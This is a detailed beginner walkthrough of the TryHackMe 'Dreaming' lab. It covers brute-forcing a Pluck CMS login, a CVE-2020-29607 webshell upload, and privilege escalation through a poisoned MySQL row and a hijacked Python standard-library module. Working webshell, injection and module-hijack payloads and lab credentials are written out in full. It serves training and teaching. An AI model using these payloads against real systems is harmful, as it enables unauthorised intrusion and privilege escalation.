---
description: "TryHackMe Dreaming — the king of dreams is imprisoned and his kingdom is in ruins. An untouched Apache default page hides /app/pluck-4.7.13, a Pluck CMS whose password-only login is guarded by a brute-force lockout that does not reliably work. The published CVE-2020-29607 zip exploit fails on this box because PHP has no zip extension — the same uploader's .tar.gz branch uses pure-PHP tarlib and works. From www-data: lucien's password sits in a world-readable health-check script, a sudo rule runs death's getDreams.py which f-strings a MySQL column straight into shell=True, and /usr/lib/python3.8/shutil.py is group-writable by death while morpheus's cron imports it every minute. Root fell out of the same three lines for free. Every command, flag, and wrong turn explained for a beginner."
---

# Dreaming — a CMS, a database row, and a standard library module

**TryHackMe · challenge: Dreaming · target: `10.x.x.x` (the lab IP changes per lease)**

> **All three flags are redacted** here as `THM{[redacted]}`. Everything that teaches stays — every
> command, every flag on every command, the payloads, the controls, and all four wrong turns. The flag
> strings themselves teach nothing; printing them just hands the room's answers to the next person.
> Credentials *are* kept, because the chain is unexplainable without them and finding them is the lesson.

**The brief.** *"While the king of dreams was imprisoned, his home fell into ruins. Can you help Sandman
restore his kingdom?"*

That is Neil Gaiman's *The Sandman*. Morpheus is the king of dreams; **Lucien** is the librarian of the
Dreaming; **Death** is his older sister. The room wants three flags named after those three characters —
and, as we will see, those are three real Linux user accounts on the box. The story is the map.

## A few words first, for a total beginner

Skip this if you already know it. Nothing below assumes you read it twice.

- **Port** — a numbered door on a machine. One IP address has 65 535 of them. A web server usually
  listens on port 80; remote logins usually on port 22.
- **Service** — the program answering behind a door. "Port 80 is open" is not useful. "Port 80 is Apache
  2.4.41" is, because now you can look up what that software gets wrong.
- **HTTP request** — what your browser sends. `GET` means "give me this page". `POST` means "here is some
  data, do something with it" — a login form sends a POST.
- **Shell** — a text prompt where you type commands on a machine. Getting one on someone else's machine
  is usually the goal.
- **RCE** (Remote Code Execution) — you can make the target run commands you choose. The strongest class
  of web bug.
- **CMS** (Content Management System) — software that runs a website so a non-programmer can edit pages.
  WordPress is the famous one; **Pluck** is a small, old one.
- **Hash** — a one-way scramble of a password. The site stores the hash, not the password. You can check
  a guess by hashing it and comparing, but you cannot un-scramble the stored value.
- **`sudo`** — "run this one command as another user". An administrator decides exactly which commands
  which user may run this way. A single sloppy entry is often the whole privilege escalation.
- **cron** — Linux's scheduler. It runs commands automatically at fixed times, as a chosen user.
- **Privilege escalation** — going from a low-powered account to a more powerful one, ending at `root`,
  who can do anything.

---

## Phase 1 — Recon: what is listening?

**What is about to happen:** before anything else I want to know which doors on this machine are open,
and what is behind each one. Everything later depends on this, so it goes first.

### Step 1 — is the target even alive?

```bash
ping -c 3 -W 2 10.x.x.x
```

- `-c 3` — send exactly 3 packets, then stop. Without it, `ping` runs forever.
- `-W 2` — wait at most 2 seconds for each reply.

It answered in ~18 ms. Worth noting: if `ping` had failed that would **not** prove the box is down —
plenty of machines are configured to ignore pings. It is a cheap yes, not a meaningful no.

### Step 2 — scan every port

```bash
sudo nmap -p- --min-rate 2000 -T4 -Pn -n 10.x.x.x -oN nmap-allports.txt
```

`nmap` is the standard port scanner. Flag by flag:

- `-p-` — **all 65 535 ports**. This matters: with no `-p` at all, nmap checks only its list of 1 000
  common ports, and lab machines love to hide a service on port 8080 or 31337. Checking everything costs
  seconds here; skipping it costs you the whole room.
- `--min-rate 2000` — send at least 2 000 packets per second. This is what turns a 20-minute scan into a
  7-second one.
- `-T4` — timing template 4, "aggressive". Speeds up waiting.
- `-Pn` — **skip the ping check** and just scan. If the host ignored pings, `-Pn` stops nmap from
  concluding "host down" and quitting before it starts.
- `-n` — do not do DNS lookups. Saves time, and there is no name to look up.
- `-oN file` — save normal-format output to a file. Always save your scans; you will re-read them.

Result — only two doors:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Step 3 — what software is behind them?

```bash
sudo nmap -p22,80 -sC -sV -Pn -n 10.x.x.x -oN nmap-services.txt
```

- `-p22,80` — only the two ports we know are open. No point re-scanning 65 533 closed ones.
- `-sV` — **version detection.** nmap talks to each service and works out the exact product and version.
- `-sC` — run the **default script set**: a bundle of safe checks (titles, certificates, banners).

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

Two facts to carry forward. **OpenSSH 8.2p1 and Apache 2.4.41 are both the stock Ubuntu 20.04 builds**,
so the box is Ubuntu 20.04 — useful later when we hit `python3.8`, which is that release's default
Python. And the web server's title is the **Apache default page**, the "It works!" placeholder. That
means the real application is not at the root of the site; it is in a subdirectory we have to find.

---

## Phase 2 — Enumeration: find the application

### Step 4 — read the default page before fuzzing anything

```bash
curl -s -o index.html -w "%{http_code} %{size_download}b\n" http://10.x.x.x/
```

- `curl` fetches a URL from the command line.
- `-s` — silent; no progress bar cluttering the output.
- `-o index.html` — save the body to a file.
- `-w "..."` — print these specific facts afterwards. `%{http_code}` is the status number (200 = OK,
  404 = not found), `%{size_download}` the size in bytes.

10 918 bytes — the exact size of the stock Ubuntu Apache page, and reading it shows nothing added.
`robots.txt`, `sitemap.xml`, `.git/HEAD` and `README.md` all 404.

This step looks like it achieved nothing. It did: it is **free information that cannot be destroyed by
reading it**, and it rules out the possibility that the answer was sitting in an HTML comment while I
went off and fired thousands of requests at the server.

### Step 5 — directory discovery, with controls

**What is about to happen:** I will ask the server about thousands of possible folder names and keep the
ones that exist. This is called content discovery or "fuzzing".

Two things about it that beginners are rarely told:

**It is not a read-only operation.** It sends a real `GET` to every name it can think of. If the wordlist
contains `reset`, `install` or `delete`, you have just visited those pages. On an app with an installer,
that can rebuild the database and every measurement you take afterwards is measuring data *you* created.
So strip those names out first:

```bash
grep -viE '^(setup|install|reset|clear|block|seed|migrate|init|delete|drop|truncate|purge|shutdown|reboot|logout|remove|destroy)$' \
  /usr/share/wordlists/dirb/common.txt > wl-common-safe.txt
```

- `grep` filters lines. `-v` inverts (keep lines that do **not** match), `-i` ignores case,
  `-E` enables the fuller regex syntax. `^(a|b|c)$` means "the whole line is exactly a, b or c".

**You must be able to tell a working scanner from a broken one.** An empty result means either "nothing
is there" or "my requests never arrived", and those look identical. So every run carries two controls:

```bash
printf 'index.html\nzzz-negative-control-9f3a\n' >> wl-common-safe.txt
```

- a **positive control** — `index.html`, which we know exists. If it is not reported, the scanner is broken.
- a **negative control** — `zzz-negative-control-9f3a`, which cannot exist. If it *is* reported, the
  scanner is matching everything and every other result is meaningless.

Read the control rows **before** the result rows. Always.

```bash
ffuf -u http://10.x.x.x/FUZZ -w wl-common-safe.txt -t 25 -mc all -fc 404 -s
```

- `-u ...FUZZ` — the URL. `ffuf` replaces the word `FUZZ` with each wordlist entry in turn.
- `-w file` — the wordlist.
- `-t 25` — 25 requests in parallel. **Keep this low.** These lab machines often have a single CPU;
  `-t 80` will knock the box over and then you are debugging your own traffic instead of the room.
- `-mc all` — match all status codes...
- `-fc 404` — ...then filter out 404 (not found). Doing it this way rather than listing "good" codes
  means a weird status like 500 still reaches you. (Careful: ffuf's *matchers* are OR-ed together, so
  `-mc all -mr something` matches everything. Filters, `-f*`, are the reliable way to subtract.)
- `-s` — silent; results only.

```
app
.htpasswd
.hta
.htaccess
index.html          <- positive control fired
server-status
```

No `zzz-negative-control-9f3a`. **The instrument is trustworthy**, and `/app` is real.
(`server-status` is Apache's status page; it answers `403 Forbidden`, so it is a dead end.)

### Step 6 — /app, and a directory listing

```bash
curl -s http://10.x.x.x/app/
```

`/app/` returns an **Apache directory listing** — a plain index of files, produced when a folder has no
`index.html` and the server is configured to show its contents. This is a misconfiguration in its own
right, and it hands us:

```
pluck-4.7.13/
```

**Pluck CMS, version 4.7.13.** The version is in the folder name. Free.

```bash
curl -s http://10.x.x.x/app/pluck-4.7.13/login.php
```

```html
<title>pluck 4.7.13 - log in</title>
<form action="" method="post">
  <input name="cont1" size="25" type="password" />
  <input type="text" name="bogus" style="display: none;" />
  <input type="submit" name="submit" value="Log in" />
</form>
```

A login with **a password and no username** — Pluck has a single administrator.

### Step 7 — is anything on this box non-standard?

Directory listing is enabled all through the tree, so instead of guessing filenames I walked every
listable folder and compared the result against the real Pluck 4.7.13 release:

```bash
curl -sL -o pluck.tar.gz "https://github.com/pluck-cms/pluck/archive/refs/tags/4.7.13.tar.gz"
tar xzf pluck.tar.gz
```

- `-L` — follow redirects (GitHub redirects release downloads).
- `tar xzf` — e**x**tract, g**z**ip-compressed, **f**ile named next.

The verdict: **the installation is stock.** No extra file, no backup, no `.bak`, nothing in `files/` or
`images/`, and one single content page containing one quote. The password hash lives in
`data/settings/pass.php`, but that is a `.php` file — Apache *executes* it rather than showing it, so it
returns 0 bytes. There is no way to read the hash.

A second, much larger sweep of the web root (220 524 candidates from `directory-list-2.3-medium`, ~150
seconds at 25 threads, same two controls) found **only** `/app` and the forbidden `/server-status`.

So the whole attack surface is that one password box. Which makes the next decision the important one.

---

## Phase 3 — Getting in

### Step 8 — read the login code before typing into the login

**Never design an attack from memory of how software "probably" works.** The source is public:

```bash
curl -s "https://raw.githubusercontent.com/pluck-cms/pluck/4.7.13/login.php"
```

Three things come out of it that change the plan:

```php
$pass = hash('sha512', $cont1);
```

**1.** The password is hashed with **SHA-512** and compared against `$ww` from `pass.php`. Since we
cannot read that file, there is nothing to crack offline. Every guess must be a live request.

**2.** The form wants `cont1=<password>&submit=Log+in`, and `bogus` must stay **empty** — it is a
honeypot, an invisible field that only an automated bot would fill in.

```php
define('LOGIN_ATTEMPT_FILE', 'data/settings/loginattempt_'.hash('sha512', $_SERVER['REMOTE_ADDR']).'.php');
if (file_exists(LOGIN_ATTEMPT_FILE)) {
    require(LOGIN_ATTEMPT_FILE);
    $timestamp = $timestamp + 300;
    if (($tries == 5)) {
        if ($timestamp > time())
            $login_error = show_error($lang['login']['too_many_attempts'], 1, true);
        else
            unlink(LOGIN_ATTEMPT_FILE);
    }
}
```

**3. Brute-force protection.** Each failure increments a counter in a file named after your IP address;
at 5 failures you are refused for **300 seconds** — a correct password included.

Do the arithmetic before doing anything else, because it decides the whole approach.
Five guesses per five minutes is **60 an hour**. `rockyou.txt`, the standard 14 344 391-entry password
list, would take **239 906 hours**. That is not a slow plan; it is an impossible one.

### Step 9 — but does the lockout actually work?

Here is the move that saved the room. The counter file is written into `data/settings/` — **and that
directory has a listing we can read.** So the question "is the lockout armed?" can be answered with one
wrong password and one directory read, through a channel we already control:

```bash
curl -s http://10.x.x.x/app/pluck-4.7.13/data/settings/          # before
curl -s -X POST -d 'cont1=deliberately-wrong-a91f&bogus=&submit=Log+in' \
     http://10.x.x.x/app/pluck-4.7.13/login.php
curl -s http://10.x.x.x/app/pluck-4.7.13/data/settings/          # after
```

- `-X POST` — send a POST instead of a GET.
- `-d '...'` — the form body. `&` separates fields.

Afterwards a new file appears:

```
loginattempt_d857bec3e8...e052e.php
```

The lockout is armed, and `data/settings/` is writable by the web server — remember that, it matters
later. Now the real question: does it *bite*? Eight more wrong passwords, one after another:

```
attempt 1 (cumulative 2): Password incorrect
attempt 2 (cumulative 3): Password incorrect
...
attempt 8 (cumulative 9): Password incorrect
```

**Nine failures, never blocked.** On paper it should have refused at six. It did not.

I never found a certain explanation, and it is more honest to say so than to invent one. What matters is
that **the code said "rate limited" and the target said "not rate limited", and only the experiment could
tell them apart.** Reading source is how you form a hypothesis. Measuring is how you find out.

### Step 10 — the wordlist run, with a positive success test

```bash
ffuf -w pw-themed.txt \
     -u http://10.x.x.x/app/pluck-4.7.13/login.php \
     -X POST -d 'cont1=FUZZ&bogus=&submit=Log+in' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -fr 'Password incorrect' -t 25
```

- `-H '...'` — add a header. `Content-Type: application/x-www-form-urlencoded` tells the server the body
  is form fields; without it PHP may not populate `$_POST` at all and **every** guess fails.
- `-fr 'Password incorrect'` — **filter by regex**: throw away any response containing that phrase.

The candidate list was 1 047 entries: about 50 *Sandman*-themed words (morpheus, lucien, death, endless,
delirium, destiny, dreaming, kingofdreams…), the top 1 000 of `rockyou.txt`, and the inverted control
`zzz-cannot-succeed-9f3a`. Themed guessing **supplements** a wordlist; it never replaces one.

612 requests per second, three seconds, and seven survivors:

| Candidate | Size | Time | What it actually was |
|---|---|---|---|
| `password` | **1126** | 19 ms | the success page |
| `123321`, `112233`, `102030`, `123456`, `0123456`, `123456789` | 1364 | 3 647 ms | the **lockout** page |
| `zzz-cannot-succeed-9f3a` | — | — | **not reported — control held** |

Read that table carefully, because a careless run misreads it twice.

Those six are **not six passwords**. They are the lockout finally firing at the tail end of the run —
which tells us the protection is *unreliable*, not absent, and that my nine-attempt conclusion was an
over-generalisation. I only know they are lockout pages because filtering on "does not contain the
failure string" surfaces **every** non-failure page, lockouts included. Had I filtered on response size,
I would have had seven equally plausible "hits" and no way to rank them.

And **"the failure string is absent" is a terrible success test on its own** — it is true of every error
page ever written. So confirm positively, after waiting out the 300-second block:

```bash
curl -s -c pluck.jar -X POST -d 'cont1=password&bogus=&submit=Log+in' \
     http://10.x.x.x/app/pluck-4.7.13/login.php
# -> Password correct. Logging you in...

curl -s -b pluck.jar "http://10.x.x.x/app/pluck-4.7.13/admin.php?action=start"
# -> <title>pluck 4.7.13 administration center - start</title>
```

- `-c pluck.jar` — save cookies to a file. The session cookie is what proves you are logged in.
- `-b pluck.jar` — send those saved cookies with this request.

**The Pluck administrator password is `password`.**

---

### Step 11 — RCE, and why the published exploit fails here

Pluck 4.7.13's known vulnerability is **CVE-2020-29607**: an administrator can "install a module" by
uploading an archive, and the software extracts it into a web-reachable folder without checking what is
inside. Put a PHP file in the archive and you can then simply visit it.

Every write-up online says: zip a PHP file, upload it, fetch it. So:

```bash
printf '%s\n' '<?php echo "SHELLOK:"; if(isset($_REQUEST["c"])) { echo shell_exec($_REQUEST["c"]." 2>&1"); } ?>' > zz_tmp_shell.php
zip zz_tmp_shell.zip zz_tmp_shell.php
```

A word on that payload, because the detail is deliberate. `shell_exec` runs a shell command and returns
its output; `$_REQUEST["c"]` is the command taken from the URL; `2>&1` merges error output into normal
output so failures are visible instead of silent. And **`SHELLOK:` is printed unconditionally** — a
marker that separates "the file is there and PHP ran it" from "404" and from "uploaded but not executed".
Positive proof, not the absence of an error.

```bash
curl -s -b pluck.jar -F "sendfile=@zz_tmp_shell.zip" -F "submit=Upload" \
     "http://10.x.x.x/app/pluck-4.7.13/admin.php?action=installmodule"
```

- `-F` — send a multipart form (what a file-upload form produces). `@file` means "attach this file".

### Wrong turn #1 — the zip upload half-worked, silently

The result was neither success nor failure:

- `data/modules/zz_tmp_shell.zip` — **still there**, not deleted
- `data/modules/zz_tmp_shell/` — created, **empty**
- `data/modules/zz_tmp_shell.php` — **404**
- the page printed no success message and no error

The answer was in the uploader's own source, which I already had:

```php
if (strpos($filename, '.tar.gz')) {
    require_once ('data/inc/lib/tarlib.class.php');       // pure PHP
    ...
}
else {                                                    // .zip
    require_once ('data/inc/lib/unzip.class.php');
    $zip = new UnZIP($dir.'/'.$filename);
    $zip->extract();
    unlink($dir.'/'.$filename);
```

And `unzip.class.php` extracts using `zip_open()`, `zip_read()`, `zip_entry_name()` — functions from
**PHP's `zip` extension**. This box does not have it installed:

```
php -m | grep -i zip     ->  (nothing)
```

So `zip_open()` is an undefined function, PHP aborts the request immediately, and it never reaches the
`unlink()` line — **which is exactly why the .zip stayed on disk.** The empty directory came from the
unzip class creating its target folder before it ever tried to read the archive. Every symptom explained.

- **Symptom:** an upload that looks half-done, with no error anywhere.
- **Real cause:** a missing PHP extension on the target, not a bad payload.
- **The fix was three lines away in code I had already read:** the `.tar.gz` branch uses Pluck's own
  `tarlib.class.php`, which is pure PHP and needs no extension.
- **Rule:** when a public exploit half-works, read the *target's* handler before touching the payload.

```bash
tar czf zz_tmp_shell.tar.gz zz_tmp_shell.php
curl -s -b pluck.jar -F "sendfile=@zz_tmp_shell.tar.gz" -F "submit=Upload" \
     "http://10.x.x.x/app/pluck-4.7.13/admin.php?action=installmodule"
# -> "The module has been installed successfully."

curl -s -G --data-urlencode "c=id;hostname" \
     "http://10.x.x.x/app/pluck-4.7.13/data/modules/zz_tmp_shell.php"
# -> SHELLOK:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- `-G` — send the `--data` values as a **query string on a GET** instead of a POST body.
- `--data-urlencode` — escape the value properly, so spaces and semicolons survive the trip.

**Remote code execution as `www-data`.** Note what this deliberately is *not*: a reverse shell. A
webshell's output comes back through the same HTTP connection I already control — no callback to my
machine, no firewall in the path, and no silence to misinterpret.

---

## Phase 4 — Three users, three flags

```bash
grep -E "sh$" /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
lucien:x:1000:1000:lucien:/home/lucien:/bin/bash
death:x:1001:1001::/home/death:/bin/bash
morpheus:x:1002:1002::/home/morpheus:/bin/bash
```

The three flags are three accounts. Each home directory holds a flag file readable only by its owner, so
this is three privilege escalations, not a treasure hunt. Two world-readable scripts give the plot away:

```
/opt/test.py       -rwxr-xr-x  lucien
/opt/getDreams.py  -rwxrw-r--  death
```

### Lucien — a password left in a health-check script

```python
# /opt/test.py
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"
```

A little script that logs into Pluck to check it is alive, with the password in a variable. It is not the
Pluck password we already have — it is *lucien's*, and people reuse passwords:

```bash
ssh lucien@10.x.x.x        # password: HeyLucien#@1999!
```

```
uid=1000(lucien) gid=1000(lucien) groups=1000(lucien),4(adm),24(cdrom),30(dip),46(plugdev)
$ cat ~/lucien_flag.txt
THM{[redacted]}
```

**Lucien flag: `THM{[redacted]}`** — and it matches the shape the room prints under the answer box,
`***{***_*********}`. Those shapes are a free checksum: any candidate that does not fit is wrong and you
can reject it without spending a submission.

Two more things from lucien's account. First:

```bash
sudo -l          # "what am I allowed to run as another user?"
```

```
(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

lucien may run **one specific script as death**, with no password. Second, lucien's shell history:

```bash
cat ~/.bash_history
```

```
mysql -u lucien -plucien42DBPASSWORD
...
nano /usr/lib/python3.8/shutil.py
```

A database password typed on the command line — where it is saved forever — and a note that somebody
once edited a **Python standard library file**. Both matter.

### Death — command injection through a database row

`/opt/getDreams.py` is a copy of death's script with the database password blanked, but the logic intact:

```python
query = "SELECT dreamer, dream FROM dreams;"
...
for dream_info in dreams_info:
    dreamer, dream = dream_info
    command = f"echo {dreamer} + {dream}"
    shell = subprocess.check_output(command, text=True, shell=True)
```

Read that middle line slowly. `f"echo {dreamer} + {dream}"` builds a **text string** by pasting database
values into it, and `shell=True` hands that string to a shell to interpret. A shell treats `;` as "end of
command, start another". So whoever controls a row in that table controls what the shell runs — and it
runs as whoever runs the script. lucien can run it **as death**.

**Look at the table before writing to it.** Once you have written to a room's database you can no longer
tell its data from your own:

```bash
mysql -u lucien -plucien42DBPASSWORD -e 'use library; describe dreams; select * from dreams;'
```

- `-u` user, `-p` password (no space after `-p`, which is why it looks glued on), `-e` run this SQL and exit.

```
dreamer  varchar(50)
dream    varchar(255)

Alice  Flying in the sky
Bob    Exploring ancient ruins
Carol  Becoming a successful entrepreneur
Dave   Becoming a professional musician
```

That snapshot immediately paid for itself twice:

1. `dreamer` is `varchar(50)` — a 50-character limit — and my first payload was 63 characters:
   `Data too long for column 'dreamer'`. `dream` holds 255, so the payload goes **there** instead.
2. Checking what my database user may actually do:

```bash
mysql -u lucien -plucien42DBPASSWORD -e "SHOW GRANTS;"
```

```
GRANT SELECT, INSERT ON `library`.`dreams` TO `lucien`@`localhost`
```

**No `DELETE`.** A row I insert is a row I can never remove — I would be permanently littering the room
for the next person. `UPDATE` *is* granted, so the reversible move is to temporarily overwrite an
existing row and put the original value back from the snapshot.

### Wrong turn #2 — the payload's exit code killed the script

My first working-looking payload ended with `sudo -n -l`, to check what death could do. The result was
**complete silence** — not one of the four rows printed. Silence looks exactly like "the injection did
not work".

It had worked. `subprocess.check_output` **raises an exception if the command exits non-zero**, and
death has no passwordless sudo, so `sudo -n -l` exited 1. `getDreams.py` only catches
`mysql.connector.Error`, so the exception went uncaught and killed the loop on the very first row.

- **Symptom:** no output at all.
- **Real cause:** I judged the payload by whether the *commands* would run, not by what the *caller* does
  with their exit status.
- **Rule:** when injecting into `check_output`, end the payload with `; true` so the whole thing always
  exits 0.

```sql
UPDATE dreams SET dream = "x; id; cat /home/death/death_flag.txt; echo ZZEND; true"
WHERE dreamer = 'Alice';
```

The shell then receives `echo Alice + x; id; cat /home/death/death_flag.txt; echo ZZEND; true`.

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

```
Alice + x
uid=1001(death) gid=1001(death) groups=1001(death)
THM{[redacted]}
ZZEND
```

**Death flag: `THM{[redacted]}`**, matching `***{**_*****_*_****}`.

And immediately, in the same run, put the row back and prove it:

```sql
UPDATE dreams SET dream = 'Flying in the sky' WHERE dreamer = 'Alice';
SELECT * FROM dreams;
```

### Morpheus — hijacking a standard library module

death turns out to have no sudo rights at all (`sudo: a password is required`), so that door is shut. The
open one was signposted in lucien's shell history. Recall `/home/morpheus/restore.py`:

```python
from shutil import copy2 as backup
src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"
backup(src_file, dst_file)
```

`shutil` is part of Python's **standard library** — code that ships with Python itself. Now look at it:

```bash
ls -la /usr/lib/python3.8/shutil.py
```

```
-rw-rw-r-- 1 root death 51474 /usr/lib/python3.8/shutil.py
```

Owner `root`, **group `death`, and group-writable** (`rw-` in the middle triplet). death can edit a file
that every Python program on the machine loads.

**Why that is code execution:** when Python imports a module, it *runs the module's top level*. Anything
appended to `shutil.py` executes inside whatever process imports it, as whatever user that process is.

**Who imports it, and when?** Rather than append something and hope, check. lucien is in group `adm`,
which on Ubuntu grants read access to the system logs:

```bash
grep -i cron /var/log/syslog
```

```
CRON[1542]: (morpheus) CMD (/usr/bin/python3.8 /home/morpheus/restore.py)
CRON[1842]: (morpheus) CMD (/usr/bin/python3.8 /home/morpheus/restore.py)
CRON[2111]: (morpheus) CMD (/usr/bin/python3.8 /home/morpheus/restore.py)
```

**morpheus's cron, every single minute.** "Wait and see" becomes "wait 60 seconds".

Before touching a system file, record how to undo it — a checksum and a copy:

```bash
sha256sum /usr/lib/python3.8/shutil.py       # a8658146be2d...ac5a
cp /usr/lib/python3.8/shutil.py /tmp/zz_shutil.orig
```

`sha256sum` produces a fingerprint of a file's exact contents. Two files with the same SHA-256 are
identical, so this is how you *prove* at the end that you put it back rather than assuming you did.

Then append, wrapped in `try/except` so that a mistake cannot break `apt`, `logrotate`, or anything else
on the box that imports `shutil`:

```python
try:
    import os as _zzos
    _zzos.system("(id; cat /home/morpheus/morpheus_flag.txt) >> /tmp/zz_kingdom_$(id -u).txt 2>&1; chmod 666 /tmp/zz_kingdom_$(id -u).txt")
except Exception:
    pass
```

### Wrong turn #3 — two broken detectors on the same step

**First**, my watcher grepped the output file for `morpheus|THM\{` and announced a hit within 15 seconds.
It was not a hit. The text it matched was death's own import producing an error message:

```
cat: /home/morpheus/morpheus_flag.txt: Permission denied
```

The word "morpheus" came from the **file path I was trying to read**, not from the identity I was trying
to prove. A detector must match something that only success can produce — `uid=1002`, or the flag itself —
never a string that also appears in the failure.

**Second**, once the pattern was fixed, nothing arrived at all, even though cron was demonstrably running
every minute. The payload *was* firing; it could not write:

```
sh: 1: cannot create /tmp/zz_who.txt: Permission denied

$ ls -la /tmp/zz_who.txt
-rw-rw-rw- 1 death death 108 /tmp/zz_who.txt      # mode 666 = everyone may write
$ ls -ld /tmp
drwxrwxrwt 13 root root                            # the trailing 't' is the sticky bit
```

A world-writable file that another user cannot write to. The cause is a kernel hardening setting called
**`fs.protected_regular`**, on by default since Linux 4.19: *in a sticky, world-writable directory such as
`/tmp`, you may not open a file you do not own using `O_CREAT`* — and shell redirection, both `>` and
`>>`, always passes `O_CREAT`. It exists to stop a classic attack where someone pre-creates a file another
program is about to write.

The fix is to write to a filename that does not exist yet, one per user — hence `$(id -u)` in the payload
above, which expands to the numeric user ID. Sixty seconds later:

```
-rw-rw-rw- 1 morpheus morpheus 102 /tmp/zz_kingdom_1002.txt

uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)
THM{[redacted]}
```

**Morpheus flag: `THM{[redacted]}`**, matching `***{******_*****_***_*****}`. All three shapes check out.

---

## The finding the room does not ask about

Next to the morpheus file sat a second one nobody requested:

```
-rw-rw-rw- 1 root root 67 /tmp/zz_kingdom_0.txt

uid=0(root) gid=0(root) groups=0(root)
THM{[redacted]}
```

**`uid=0` is root.** Some root-owned job on this machine imports `shutil` too, so the same three appended
lines produced **root code execution, twice, with no additional step.**

That is the real severity here, and it is worth saying plainly: making a standard library module
group-writable by a service account is not a privilege escalation *to morpheus*. It is a privilege
escalation **to every user who runs Python on that machine, root included**. The room's three flags
under-sell the bug.

It also created a problem of my own making — a **root-owned file containing a flag, mode 666**, sitting in
`/tmp` where any user on the box could read it. A vulnerability I introduced. And by the same
`fs.protected_regular` rule I had just learned, neither lucien nor death could delete it.

---

## Cleaning up — you break it, you fix it

A lab box is shared. Everything below was verified, not assumed.

**The database** was restored after every injection and re-read to prove it — Alice's row reads
`Flying in the sky` again, and all four rows match the pre-attack snapshot.

**The web server**, through the webshell, deleting the webshell itself last (which works fine on Linux — a
running process keeps its file open even after the name is removed):

| Removed | Verified by |
|---|---|
| `data/modules/zz_tmp_shell.zip` (the failed upload) | gone from the directory listing |
| `data/modules/zz_tmp_shell/` (empty dir from the failed extract) | gone from the directory listing |
| `data/settings/modules/zz_tmp_shell/` | gone |
| `data/settings/loginattempt_<sha512>.php` | gone |
| `data/modules/zz_tmp_shell.php` (**the webshell**) | re-fetched the URL → **404** |

`data/modules/` lists exactly the stock modules again, `login.php` still answers 200 and the site still
renders — nothing was left broken on the way out. **A webshell left behind in a reachable upload folder is
a vulnerability you personally introduced, and on a shared lab box the next person inherits it.**

**The root-owned litter** was cleared using the access already in hand: the appended block was replaced
with a *self-removing* one that deletes the marker files, copies the backup back over `shutil.py`, and
then deletes the backup. morpheus's per-minute cron cleared its own file; root's next import cleared
root's and restored the module — after which the block no longer exists and cannot fire again. Root ran
it within 20 seconds.

The proof is the checksum, not a hope:

```bash
sha256sum /usr/lib/python3.8/shutil.py
# a8658146be2d29307f16a5d37ae9adf051a269d11aaa48d3b2010c6e9879ac5a   <- identical to before
tail -4 /usr/lib/python3.8/shutil.py                                  # stock ending, no appended block
ls /tmp/zz_*                                                          # No such file or directory
```

Locally: every `nmap` and `ffuf` process finished, no watchers left running, no lines added to `/etc/hosts`.

---

## The chain, in one picture

```
Apache default page  ->  /app/ has directory listing  ->  Pluck CMS 4.7.13
        |
        v
  login.php: password-only, SHA-512, "5 tries / 5 min" lockout that does not reliably work
        |  wordlist attack, 1047 candidates, 3 seconds  ->  password = "password"
        v
  CVE-2020-29607 module upload  ->  .zip branch FAILS (no PHP zip extension)
                                ->  .tar.gz branch works (pure-PHP tarlib)     == www-data
        |
        v
  /opt/test.py holds lucien's password in a variable, reused for SSH          == lucien
        |
        v
  sudo (death) NOPASSWD /home/death/getDreams.py
  -> f"echo {dreamer} + {dream}" with shell=True, fed from a MySQL table      == death
        |
        v
  /usr/lib/python3.8/shutil.py is root:death and group-writable
  -> morpheus's cron runs restore.py every minute, which imports shutil       == morpheus
        \
         -> and a root job imports shutil too                                 == root (free)
```

## What this room actually teaches

- **Read the target's code before you attack it, and measure the target before you believe the code.**
  Reading `login.php` told me the login was rate-limited. It was not, reliably. Reading it was still
  right — that is how you form a hypothesis worth testing. Testing is how you find out.
- **Controls are not bureaucracy.** A positive and a negative control in every sweep, and an inverted
  control in the password run, are what let me tell six lockout pages from six passwords.
- **Detect success positively.** "The failure string is absent" is true of every error page in the world.
  And never let your detector match a string that also appears in the failure — `morpheus` appeared in
  the *error message* about morpheus's file.
- **Read the data before you write to it.** The table snapshot caught a 50-character column limit and a
  missing `DELETE` grant, and it is the only reason the room could be put back the way it was found.
- **When a public exploit half-works, the environment is usually the difference.** No PHP zip extension
  turned the standard PoC into a silent no-op — and the alternative path was three lines away in code I
  had already downloaded.
- **A file's permissions are a list of everyone who can run code as everyone else.** `rw-` for group
  `death` on one standard library file quietly handed out execution as morpheus *and* as root.
